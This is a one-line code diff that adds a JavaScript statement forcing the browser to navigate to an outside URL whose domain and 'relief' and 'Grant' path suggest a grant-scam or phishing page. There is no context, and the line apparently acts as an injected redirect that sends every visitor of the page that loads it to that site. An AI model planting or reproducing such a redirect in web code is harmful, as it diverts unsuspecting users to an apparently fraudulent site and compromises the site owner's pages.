@@ -1,0 +1,1 @@
+window.location.href = "https://nersi-relief.proinfo.site/Grant";
